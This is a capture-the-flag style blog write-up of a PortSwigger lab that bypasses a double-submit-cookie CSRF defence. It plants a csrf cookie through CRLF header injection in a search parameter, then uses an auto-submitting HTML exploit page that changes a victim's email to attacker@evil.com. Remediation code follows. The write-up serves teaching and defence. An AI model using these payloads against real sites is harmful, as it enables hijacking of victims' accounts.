---
layout: post
title: "PortSwigger: CSRF Where Token Is Duplicated in Cookie"
date: 2027-06-27 09:00:00 -0500
categories: [Web Security, CSRF]
tags: [csrf, crlf-injection, double-submit-cookie, portswigger, web-security-academy, cwe-352]
---

## Lab Overview

**Lab:** CSRF where token is duplicated in cookie  
**Category:** Cross-Site Request Forgery  
**Difficulty:** Practitioner

The goal is to change the victim's email address using a CSRF attack against an app that uses the "double submit cookie" pattern as its CSRF defence.

---

## Understanding the Vulnerability

The app protects its `/my-account/change-email` endpoint by requiring that the `csrf` POST body parameter matches the `csrf` cookie value. This is the **double submit cookie** pattern — a common CSRF mitigation that avoids server-side session storage.

The critical flaw: the server never validates either value against the user's session. It only checks `cookie.csrf === body.csrf`. If an attacker can plant an arbitrary `csrf` cookie in the victim's browser, both values can be set to any matching string — bypassing the protection entirely.

---

## Finding the Cookie Injection Point

Exploring the search functionality reveals that the search term is reflected directly into a `Set-Cookie` response header:

```
GET /?search=hello HTTP/2
Host: LAB

HTTP/2 200 OK
Set-Cookie: LastSearchTerm=hello; Secure; HttpOnly
```

The search value is not sanitised for CRLF characters. Injecting `%0d%0a` (carriage-return + line-feed) breaks the header line and appends a second `Set-Cookie`:

```
GET /?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None HTTP/2

HTTP/2 200 OK
Set-Cookie: LastSearchTerm=x
Set-Cookie: csrf=fake; SameSite=None; Secure; HttpOnly
```

This plants `csrf=fake` in whoever visits that URL. Adding `SameSite=None` ensures the injected cookie is sent cross-origin from the exploit server.

---

## Building the Exploit

The exploit page needs to:
1. Load the CRLF injection URL to plant `csrf=fake` in the victim's browser
2. Then immediately auto-submit a form with `csrf=fake` in the body

An `<img>` tag with the injection URL as its `src` is the delivery mechanism. Since the URL returns HTML (not an image), the browser fires `onerror`, which triggers the form submission:

```html
<html>
  <body>
    <form action="https://LAB/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf" value="fake">
    </form>
    <img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
         onerror="document.forms[0].submit()">
  </body>
</html>
```

**What the victim's browser sends after loading this page:**

```
POST /my-account/change-email HTTP/2
Host: LAB
Cookie: session=<victim-session>; csrf=fake
Content-Type: application/x-www-form-urlencoded

email=attacker%40evil.com&csrf=fake
```

The server checks `cookie.csrf ("fake") === body.csrf ("fake")` — passes. Email changed.

---

## The Fix

**1. Switch to the synchronizer token pattern**  
Store the CSRF token server-side in the user's session at generation time. On every state-changing request, compare against the stored value — never against a cookie:

```js
// Generation
session.csrfToken = crypto.randomBytes(32).toString('hex');

// Validation
if (!req.body.csrf || req.body.csrf !== req.session.csrfToken) {
  return res.status(403).send('CSRF validation failed');
}
```

**2. Strip CRLF from reflected values**  
Before placing any user input into response headers:

```js
const safe = req.query.search.replace(/[\r\n]/g, '');
res.setHeader('Set-Cookie', `LastSearchTerm=${safe}; Secure; HttpOnly`);
```

**3. SameSite=Strict as defence-in-depth**  
With `SameSite=Strict` on the session cookie, cross-origin form submissions never carry the session — CSRF is impossible regardless of token handling.

---

## Key Takeaway

The double-submit cookie pattern is only safe when the attacker cannot control the cookie value. CRLF injection, subdomain takeover, and cookie tossing all defeat it. For any app where attacker-influenced cookies are plausible, the synchronizer token pattern (server-side session binding) is the correct defence.

**CWE:** [CWE-352 — Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
